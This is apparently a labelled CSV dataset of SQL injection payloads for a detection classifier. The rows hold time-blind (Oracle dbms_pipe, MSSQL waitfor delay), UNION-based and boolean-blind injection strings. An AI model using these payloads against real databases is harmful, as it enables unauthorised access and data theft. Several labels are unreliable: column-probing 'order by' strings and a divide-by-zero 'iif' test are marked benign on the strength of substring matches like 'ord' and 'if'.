id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
24078,"1' ) as viex where 6242 = 6242 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
24100,"1 ) where 1880 = 1880 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
23958,1 ) ) ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 20 chars.,2
23964,-4768'|| ( select 'dded' from dual where 6499 = 6499 union all select 6499--,union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
23982,1' where 9003 = 9003 waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23984,"1"" ) waitfor delay '0:0:5'--",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23993,1 ) ) waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
24006,1 ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 16 chars.,2
24015,"1'+ ( select 'qvif' where 1758 = 1758 union all select null,null,null,null,null,null,null,null#",union_based,mysql,0.9,Signals: 'if'; UNION-based payload detected; DB: mysql,2
24021,"iif ( 9229 = 4158,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
24024,1' ) ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 19 chars.,2
24084,1 ) ) ) waitfor delay '0:0:5' and ( ( ( 3481 = 3481,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
24089,"1"" where 7371 = 7371 waitfor delay '0:0:5'--",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
24095,"1 ) where 9687 = 9687 and elt ( 9607 = 9432,9432 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
24098,"1"" ) ) waitfor delay '0:0:5'--",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
24140,-7387' ) ) ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 25 chars.,2
23945,-2483' where 1327 = 1327 union all select 1327#,union_based,generic,0.7,UNION-based payload detected. Payload length: 47 chars.,2
23946,"-8699"" ) union all select 8645,8645,8645,8645,8645,8645--",union_based,generic,0.7,UNION-based payload detected. Payload length: 57 chars.,2
23955,-6100' ) as kvfc where 2377 = 2377 or 6872 = 6872--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2
23957,"1"" ) and 4595 = 4595#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
23961,1 where 9361 = 9361 and 7478 = 9170--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 37 chars.,2
